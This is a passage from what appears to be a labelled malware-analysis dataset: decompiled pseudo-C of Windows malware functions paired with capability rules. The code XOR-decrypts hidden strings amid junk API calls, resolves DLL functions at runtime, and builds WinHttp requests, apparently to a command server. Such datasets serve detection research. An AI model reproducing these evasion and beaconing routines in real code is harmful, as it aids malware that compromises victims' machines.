= (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    iVar6 = 0;\n                    var_58h = &var_14h - iVar3;\n                    do {\n                        iVar4 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n                        if (iVar4 != 0x9eba34) {\n                            *(iVar6 + iVar3) = *(&var_30h + iVar6 % var_6ch) ^ (iVar6 + iVar3)[&var_14h - iVar3];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 0x12);\n                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar3, lpProfileDir, &psz1, (&var_78h)[var_54h]);\n                    fcn.0040ddbf(1);\n                    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                    uVar2 = (*pcVar5)(0, var_5ch);\n                    (*pcVar1)(uVar2);\n                    var_54h = var_54h + 1;\n                    uVar2 = lpProfileDir;\n                    iVar3 = var_3ch;\n                } while (var_54h < 2);\n            }\n            iVar6 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar3, &lpFindFileData);\n            if (iVar6 == 0) {\n                (*_sym.imp.KERNEL32.dll_FindClose)(iVar3);\n                iVar3 = -1;\n                var_3ch = -1;\n            }\n        }\n    }\n    var_24h._0_2_ = 0x6553;\n    var_24h._2_1_ = 0x14;\n    var_24h._3_1_ = 0x79;\n    var_20h._0_2_ = 0x490b;\n    var_20h._2_1_ = 5;\n    stack0xffffffdf = 0x17793365;\n    stack0xffffffe3 = 0x15651b49;\n    stack0xffffffe7 = 0x19491d79;\n    stack0xffffffeb = 0x57793365;\n    stack0xffffffef = 0x13652a49;\n    var_ch._3_1_ = 0x79;\n    var_8h._0_2_ = 0x4917;\n    var_8h._2_1_ = 0x1b;\n    var_8h._3_1_ = 0x65;\n    var_4h._0_1_ = 0x37;\n    var_4h._1_1_ = 0x79;\n    var_4h._2_1_ = 0x72;\n    var_4h._3_1_ = 0x49;\n    var_38h = 0x79476576;\n    var_34h._0_2_ = 0x4972;\n    uVar2 = (*pcVar5)(8, 0x49);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar6 = 0;\n    var_5ch = &var_24h - iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n        if (iVar4 != 0xad480b) {\n            *(iVar6 + iVar3) = *(&var_38h + iVar6 % var_48h) ^ (iVar6 + iVar3)[&var_24h - iVar3];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x24);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar3, lpProfileDir, 0x104);\n    fcn.0040ddbf(1);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, ARG_0);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, lpProfileDir);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, iVar3);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, var_70h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, var_64h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return;\n}\n",
        "token_count": 3261
    },
    "null": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid entry0(void)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uchar *puVar8;\n    code *pcVar9;\n    int32_t iVar10;\n    code *pcVar11;\n    int32_t var_84h;\n    int32_t var_80h;\n    code *lpLibFileName;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uchar var_5bh;\n    uchar var_5ah;\n    uint var_59h;\n    uint32_t var_55h;\n    uint var_51h;\n    uint var_4dh;\n    uint var_49h;\n    uint var_45h;\n    uchar var_41h;\n    uint var_40h;\n    ushort var_3bh;\n    uint var_39h;\n    uint var_35h;\n    uint var_31h;\n    uint var_2dh;\n    uchar *var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_SetErrorMode;\n    var_84h = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_SetErrorMode)(0);\n    (*pcVar5)(uVar1 | 2);\n    var_20h = 0x223c211b;\n    var_1ch = 0x575b7b79;\n    var_18h = 0x6924590a;\n    var_8h = 0x6e796948;\n    var_4h._0_1_ = 0x35;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_28h = 0x5;\n    iVar10 = 0;\n    lpLibFileName = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar4 != 0x3703e4) {\n            *(iVar10 + iVar3) = *(&var_8h + iVar10 % var_28h) ^ (iVar10 + iVar3)[&var_20h - iVar3];\n        }\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 0xc);\n    var_24h = 0x5a3f070d;\n    var_20h = 0x1e0c2019;\n    var_1ch = 0x3c2b165e;\n    var_18h = 0x290a763d;\n    var_14h._0_2_ = 0x51e;\n    var_14h._2_1_ = 0x37;\n    var_8h = 0x3752684e;\n    var_4h._0_1_ = 0x78;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar10 = 0;\n    var_10h = &var_24h - iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetFocus)();\n        if (iVar4 != 0x574887) {\n            *(iVar10 + iVar3) = *(&var_8h + iVar10 % var_28h) ^ (iVar10 + iVar3)[&var_24h - iVar3];\n        }\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 0x13);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar3);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCommandLineW)();\n    var_8h = (*pcVar5)(uVar2, &var_84h);\n    pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    pcVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    pcVar11 = pcVar6;\n    for (iVar3 = 0x208; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *pcVar11 = 0x0;\n        pcVar11 = pcVar11 + 1;\n    }\n    lpLibFileName = pcVar6;\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, pcVar6, 0x104);\n    var_40h._0_1_ = 0x38;\n    var_40h._1_1_ = 0x71;\n    var_10h = 0x6;\n    var_40h._2_1_ = 6;\n    stack0xffffffbf = 0x3534;\n    var_3bh = 0x264e;\n    var_39h._0_2_ = 0x1671;\n    var_39h._2_2_ = 0x6f34;\n    var_35h._0_1_ = 0x4e;\n    var_35h._1_1_ = 0x30;\n    var_35h._2_2_ = 0xd71;\n    var_31h._0_2_ = 0x2434;\n    var_31h._2_2_ = 0x554e;\n    var_2dh._0_1_ = 0x71;\n    var_18h = 0x34757155;\n    var_14h._0_2_ = 0x4e41;\n    *0x41cd94 = pcVar6;\n    uVar2 = (*pcVar9)(8, 0x29);\n    iVar3 = (*pcVar5)(uVar2);\n    iVar10 = 0;\n    var_80h = &var_40h - iVar3;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        pcVar5 = lpLibFileName;\n        if (iVar4 != 0x72b2d4) {\n            *(iVar10 + iVar3) = *(&var_18h + iVar10 % var_10h) ^ (iVar10 + iVar3)[&var_40h - iVar3];\n        }\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 0x14);\n    iVar3 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(lpLibFileName, iVar3);\n    pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar3 != 0) goto code_r0x0040f1cf;\n    uVar2 = 0;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0, pcVar5);\n    fcn.00409c2e(uVar2);\n    do {\n        while( true ) {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\ncode_r0x0040f1cf:\n            if (1 < var_84h) {\n                *0x41cd94 = *(var_8h + 4);\n            }\n            *0x41cdb4 = fcn.0040ef8b();\n            fcn.00401c80();\n            (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n            iVar3 = fcn.0040e897();\n            (*_sym.imp.KERNEL32.dll_GetVersion)();\n            if (iVar3 != 1) break;\n            fcn.0040a0ee();\n            uVar2 = (*pcVar9)(0, pcVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        var_78h = 0x64364a50;\n        var_74h = 0x4a254e36;\n        var_70h = 0x4e276433;\n        var_6ch = 0x64364a21;\n        var_68h = 0x4a294e43;\n        var_64h = 0x4e0f643a;\n        var_60h._0_2_ = 0x4a16;\n        var_60h._2_1_ = 5;\n        stack0xffffff9f = 0x964;\n        var_5bh = 0x4e;\n        var_5ah = 6;\n        var_59h = 0x64184a;\n        var_55h = 0x2b4a014e;\n        var_51h = 0x1b4e2f64;\n        var_4dh._0_1_ = 0x4a;\n        var_4dh._1_1_ = 3;\n        var_4dh._2_2_ = 0x364;\n        var_49h._0_2_ = 0x74e;\n        var_49h._2_2_ = 0x194a;\n        var_45h._0_2_ = 0x364;\n        var_45h._2_2_ = 0x14e;\n        var_41h = 0x4a;\n        var_40h._0_1_ = 0x57;\n        var_40h._1_1_ = 100;\n        var_40h._2_1_ = 0x23;\n        stack0xffffffbf = 0xd4e;\n        var_3bh = 0x74a;\n        var_39h._0_2_ = 0xa64;\n        var_39h._2_2_ = 0x1a4e;\n        var_35h._0_1_ = 0x4a;\n        var_35h._2_2_ = 0x364;\n        var_31h._0_2_ = 0x74e;\n        var_31h._2_2_ = 0x2b4a;\n        var_2dh._0_1_ = 100;\n        var_2dh._1_1_ = 0x66;\n        var_2dh._2_1_ = 0x4e;\n        var_18h = 0x64774a75;\n        var_14h._0_2_ = 0x4e66;\n        var_35h._1_1_ = var_60h._2_1_;\n        uVar2 = (*pcVar9)(8, 0x9d);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar10 = 0;\n        var_80h = iVar3;\n        var_8h = &var_78h - iVar3;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n            if (iVar4 != 0x873ef8) {\n                *(iVar10 + iVar3) = *(&var_18h + iVar10 % var_10h) ^ (iVar10 + iVar3)[&var_78h - iVar3];\n            }\n            iVar10 = iVar10 + 1;\n        } while (iVar10 < 0x4e);\n        var_55h = var_55h & 0xff | 0x11436e00;\n        var_51h = 0x304b1071;\n        var_4dh._0_1_ = 0x42;\n        var_4dh._1_1_ = 5;\n        var_4dh._2_2_ = 0x2e69;\n        var_49h._0_2_ = 0x2f43;\n        var_49h._2_2_ = 0x3b71;\n        var_45h._0_2_ = 0x2c4b;\n        var_45h._2_2_ = 0x1e42;\n        var_41h = 0x69;\n        var_40h._0_1_ = 0x3f;\n        var_40h._1_1_ = 0x43;\n        var_40h._2_1_ = 0x67;\n        stack0xffffffbf = 0x3571;\n        var_3bh = 0x174b;\n        var_39h._0_2_ = 0x1042;\n        var_39h._2_2_ = 0x3869;\n        var_35h._0_1_ = 0x43;\n        var_35h._1_1_ = 0x29;\n        var_35h._2_2_ = 0x1a71;\n        var_31h._0_2_ = 0x1f4b;\n        var_31h._2_2_ = 0x7142;\n        var_2dh._0_1_ = 0x69;\n        var_10h = 0x7142434b;\n        var_ch._0_1_ = 0x69;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar4 = 0;\n        iVar10 = &var_55h + (1 - iVar3);\n        var_8h = iVar10;\n        do {\n            iVar7 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n            if (iVar7 != 0xb0b14c) {\n                *(iVar4 + iVar3) = *(&var_10h + iVar4 % var_28h) ^ (iVar4 + iVar3)[iVar10];\n            }\n            pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x28);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n        puVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        var_10h = puVar8;\n        uVar2 = (*pcVar9)(8, 0x208);\n        var_28h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        for (iVar10 = 0x208; iVar10 != 0; iVar10 = iVar10 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        puVar8 = var_28h;\n        for (iVar10 = 0x208; pcVar5 = _sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW,  iVar10 != 0;\n            iVar10 = iVar10 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(var_80h, var_10h, 0x104);\n        (*pcVar5)(iVar3, var_28h, 0x104);\n        iVar3 = fcn.0040be1a();\n        if (iVar3 == 0) {\n            iVar3 = fcn.0040b71e();\n            if (iVar3 == 0) {\n                iVar3 = fcn.0040b8ca();\n                if (iVar3 == 0) goto code_r0x0040f43d;\n            }\n        }\n        else {\ncode_r0x0040f43d:\n            puVar8 = var_10h;\n            pcVar5 = _sym.imp.SHLWAPI.dll_StrStrIW;\n            iVar3 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(*0x41cd94, var_10h);\n            if (iVar3 != 0) {\ncode_r0x0040f469:\n                fcn.0040ee9b();\n                uVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040c737, 0, 0, 0);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n                uVar2 = (*pcVar9)(0, puVar8);\n                pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                uVar2 = (*pcVar9)(0, var_28h);\n                (*pcVar5)(uVar2);\n                do {\n                    (*_sym.imp.KERNEL32.dll_Sleep)(0xffffffff);\n                } while( true );\n            }\n            iVar3 = (*pcVar5)(*0x41cd94, var_28h);\n            if (iVar3 != 0) goto code_r0x0040f469;\n            fcn.004019c7();\n        }\n        fcn.0040890f();\n    } while( true );\n}\n",
        "token_count": 3920
    },
    "00402915": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00402915(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint in_EDX;\n    uint var_4h;\n    \n    puVar2 = arg_8h;\ncode_r0x00402953:\n    do {\n        puVar2[1] = 0;\n        *puVar2 = 0;\n        var_4h = 0;\n        arg_8h = NULL;\n        iVar3 = fcn.0040314d(in_EDX, 0, &arg_8h, &var_4h);\n        if ((iVar3 != 0) || (arg_8h == NULL)) {\ncode_r0x00402977:\n            fcn.0040482b();\n            goto code_r0x0040297e;\n        }\n        uVar1 = *puVar2;\n        if (uVar1 < arg_8h) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n            fcn.0040482b();\n            goto code_r0x00402953;\n        }\n        if (uVar1 < 5) goto code_r0x00402977;\n        if (*puVar2[1] == uVar1) {\ncode_r0x0040297e:\n            return *puVar2 != 0;\n        }\n    } while( true );\n}\n",
        "token_count": 316
    },
    "0040298e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.0040298e(ushort *lpdwNumberOfBytesAvailable, uint *lpdwNumberOfBytesRead, int32_t *arg_10h, int32_t *arg_14h, \n            int32_t arg_18h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    int32_t iVar5;\n    int32_t *in_EDX;\n    int32_t iVar6;\n    ushort *puVar7;\n    code *pcVar8;\n    uint var_41ch;\n    uint lpszHeaders;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    int32_t var_fch;\n    int32_t var_f8h;\n    int32_t var_f4h;\n    uint lpdwBufferLength;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uchar var_c8h;\n    uint var_c7h;\n    uint var_c3h;\n    uint var_bfh;\n    uint var_bbh;\n    uint var_b7h;\n    uint var_b3h;\n    uint var_afh;\n    uint var_abh;\n    uint var_a7h;\n    uint var_a3h;\n    uint var_9fh;\n    uint var_9bh;\n    uint var_97h;\n    uint var_93h;\n    uint var_8fh;\n    uint var_8bh;\n    uint var_87h;\n    uint var_83h;\n    uint var_7fh;\n    uint var_7bh;\n    uint var_77h;\n    uint var_73h;\n    uint var_6fh;\n    uint var_6bh;\n    uint var_67h;\n    uint var_63h;\n    uint var_5fh;\n    uint var_5bh;\n    uint var_57h;\n    uint var_53h;\n    int32_t var_4ch;\n    int32_t *var_48h;\n    uint *hRequest;\n    uint var_40h;\n    ushort *var_3ch;\n    int32_t lpMultiByteStr;\n    uint var_34h;\n    uint var_30h;\n    uchar var_2ch;\n    uint var_2bh;\n    uint var_27h;\n    uint var_23h;\n    uint var_1fh;\n    uint var_1bh;\n    uint var_17h;\n    uint var_13h;\n    uint *var_ch;\n    uint var_8h;\n    \n    puVar3 = &lpszHeaders;\n    var_48h = in_EDX;\n    lpMultiByteStr = in_ECX;\n    for (iVar5 = 0x100; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &var_41ch;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    if (lpdwNumberOfBytesAvailable == 0x40) {\n        var_100h = 0;\n        var_104h = 0x34367964;\ncode_r0x00402a03:\n        var_108h = 0x6f62722f;\n    }\n    else {\n        if (lpdwNumberOfBytesAvailable == 0x20) {\n            var_100h = 0;\ncode_r0x004029f9:\n            var_104h = 0x32337964;\n            goto code_r0x00402a03;\n        }\n        if (lpdwNumberOfBytesAvailable == 0x140) {\n            var_100h = 0x30;\n            goto code_r0x004029f9;\n        }\n    }\n    hRequest = &var_108h;\n    if (lpdwNumberOfBytesRead != NULL) {\n        hRequest = lpdwNumberOfBytesRead;\n    }\n    iVar5 = (*_sym.imp.WS2_32.dll_gethostbyname)();\n    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar5 == 0) {\n        return 3;\n    }\n    var_4ch = 6;\n    lpdwNumberOfBytesRead = 0x5;\n    lpdwNumberOfBytesAvailable = 0x1;\n    if (*0x41caa4 == 0) {\n        var_ech = 0x480d6e3f;\n        var_e8h = 0x6e1b7836;\n        var_e4h = 0x7820480e;\n        var_e0h = 0x484d6e13;\n        var_dch = 0x6e5c7879;\n        var_d8h = 0x786c4852;\n        var_d4h = 0x48356e5a;\n        var_d0h = 0x6e1c7825;\n        var_cch._0_1_ = 6;\n        var_cch._1_2_ = 0x2348;\n        var_cch._3_1_ = 0x78;\n        var_c8h = 5;\n        var_c7h = 0x6c48116e;\n        var_c3h = 0x366e3c78;\n        var_bfh = 0x44786c48;\n        var_bbh = 0x7d484c6e;\n        var_b7h = 0x426e4978;\n        var_b3h = 0x1b781b48;\n        var_afh = 0x7a480c6e;\n        var_abh = 0x596e4678;\n        var_a7h = 0xa786c48;\n        var_a3h = 0x7848546e;\n        var_9fh = 0x426e4978;\n        var_9bh = 0x4783e48;\n        var_97h = 0x7e48586e;\n        var_93h = 0x4c6e4778;\n        var_8fh = 0x5b787c48;\n        var_8bh = 0xb48426e;\n        var_87h._0_2_ = 0x1778;\n        var_87h._2_1_ = 0x6e;\n        var_87h._3_1_ = 1;\n        var_83h = 0x1d782748;\n        var_7fh = 0x7e484d6e;\n        var_7bh = 0x526e4378;\n        var_77h = 0x42787c48;\n        var_73h = 0x7c48536e;\n        var_6fh = 0x426e4378;\n        var_6bh = 0x1b780a48;\n        var_67h = 0x2948106e;\n        var_63h = 0xd6e1478;\n        var_5fh = 0x5d783448;\n        var_5bh = 0x7948506e;\n        var_57h = 0x526e5c78;\n        var_53h._0_2_ = 0x4c48;\n        var_53h._2_1_ = 0x78;\n        var_ch = 0x48626e72;\n        var_8h = CONCAT22(var_8h._2_2_, 0x784c);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x139);\n        iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar6 = 0;\n        var_3ch = &var_ech - iVar5;\n        do {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n            if (iVar2 != 0x51b8bf) {\n                *(iVar6 + iVar5) = *(&var_ch + iVar6 % var_4ch) ^ (iVar6 + iVar5)[var_3ch];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0x9c);\n        *0x41caa4 = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(iVar5, 0, 0, 0, 0);\n        uVar1 = lpdwNumberOfBytesAvailable;\n        if (*0x41caa4 == 0) {\n            uVar4 = (*pcVar8)(0, iVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n            return uVar1;\n        }\n        (*_sym.imp.WINHTTP.dll_WinHttpSetTimeouts)(*0x41caa4, 5000, 5000, 5000, 5000);\n        uVar1 = (*pcVar8)(0, iVar5);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        in_ECX = lpMultiByteStr;\n    }\n    if (in_ECX == 0) {\n        puVar7 = NULL;\n        var_3ch = NULL;\n    }\n    else {\n        iVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)(in_ECX);\n        uVar1 = (*pcVar8)(8, (iVar5 + 1) * 2);\n        puVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        *puVar7 = 0;\n        var_3ch = puVar7;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, lpMultiByteStr, 0xffffffff, puVar7, iVar5 + 1);\n    }\n    lpMultiByteStr = (*_sym.imp.WINHTTP.dll_WinHttpConnect)(*0x41caa4, puVar7, 0x50, 0);\n    var_30h = 0x37165305;\n    _var_2ch = 0x62236d31;\n    stack0xffffffd4 = 0x53574544;\n    stack0xffffffd8 = 0x6d6a374d;\n    stack0xffffffdc = 0x45446276;\n    stack0xffffffe0 = 0x37475357;\n    stack0xffffffe4 = 0x627c6d21;\n    var_17h._3_1_ = 0x37;\n    var_13h._0_1_ = 0x45;\n    var_ch = 0x3762536d;\n    var_8h = CONCAT31(var_8h._1_3_, 0x45);\n    uVar1 = (*pcVar8)(8, 0x3d);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar6 = 0;\n    var_fch = &var_30h - iVar5;\n    var_4ch = iVar5;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        puVar7 = var_3ch;\n        if (iVar2 != 0xe13458) {\n            *(iVar6 + iVar5) = *(&var_ch + iVar6 % lpdwNumberOfBytesRead) ^ (iVar6 + iVar5)[var_fch];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x1e);\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpszHeaders, iVar5, var_3ch, 0x50);\n    uVar1 = (*pcVar8)(0, puVar7);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    puVar3 = hRequest;\n    if (lpMultiByteStr == 0) goto code_r0x00403128;\n    if (hRequest == NULL) {\n        lpdwNumberOfBytesAvailable = NULL;\n    }\n    else {\n        iVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)(hRequest);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, (iVar5 + 1) * 2);\n        lpdwNumberOfBytesAvailable = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        *lpdwNumberOfBytesAvailable = 0;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, puVar3, 0xffffffff, lpdwNumberOfBytesAvailable, iVar5 + 1);\n        pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    }\n    var_40h = 0x42326b70;\n    var_3ch = 0x776b373b;\n    var_ch = 0x42776b37;\n    var_8h = CONCAT31(var_8h._1_3_, 0x6f);\n    uVar1 = (*pcVar8)(8, 0x11);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    var_fch = iVar6;\n    hRequest = &var_40h - iVar6;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        if (iVar2 != 0xd10a5a) {\n            *(iVar5 + iVar6) = *(&var_ch + iVar5 % lpdwNumberOfBytesRead) ^ (iVar5 + iVar6)[&var_40h - iVar6];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 8);\n    puVar3 = (*_sym.imp.WINHTTP.dll_WinHttpOpenRequest)\n                       (lpMultiByteStr, iVar6, lpdwNumberOfBytesAvailable, 0, 0, 0, 0x800140);\n    hRequest = puVar3;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpdwNumberOfBytesAvailable);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    iVar5 = var_4ch;\n    if (puVar3 == NULL) {\ncode_r0x00403102:\n        lpdwNumberOfBytesAvailable = 0x1;\n    }\n    else {\n        var_10ch = 0x3300;\n        var_110h = 8;\n        iVar2 = fcn.004035a5();\n        if (iVar2 != 0) {\n            var_8h = 0;\n            var_ch = &var_41ch;\n            stack0xffffffec = 3;\n            (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(puVar3, 0x26, &var_13h + 3, 0xc);\n        }\n        (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(puVar3, 0x1f, &var_10ch, 4);\n        (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(puVar3, 0x3f, &var_110h, 4);\n        if (arg_18h != 0) {\n            var_34h = 0x6e0d5a60;\n            var_30h = 0x6c3d3208;\n            _var_2ch = 0x5a08660b;\n            stack0xffffffd4 = 0x32046e4c;\n            stack0xffffffd8 = 0x661a6c23;\n            stack0xffffffdc = 0x6e1f5a57;\n            stack0xffffffe0 = 0x6c7f325b;\n            stack0xffffffe4 = 0x5a1f660a;\n            var_17h._3_1_ = 0x6c;\n            var_13h._0_1_ = 0x6e;\n            var_ch = 0x6e6c5a32;\n            var_8h = CONCAT31(var_8h._1_3_, 0x66);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x45);\n            iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            lpdwNumberOfBytesAvailable = &var_34h - iVar5;\n            do {\n                iVar2 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n                if (iVar2 != 0x7b2689) {\n                    *(iVar6 + iVar5) =\n                         *(&var_ch + iVar6 % lpdwNumberOfBytesRead) ^ *((&var_34h - iVar5) + iVar6 + iVar5);\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x22);\n            (*_sym.imp.USER32.dll_wsprintfW)(&lpszHeaders, iVar5, arg_18h);\n            uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&lpszHeaders, 0x10000000);\n            puVar3 = hRequest;\n            (*_sym.imp.WINHTTP.dll_WinHttpAddRequestHeaders)(hRequest, &lpszHeaders, uVar1);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n            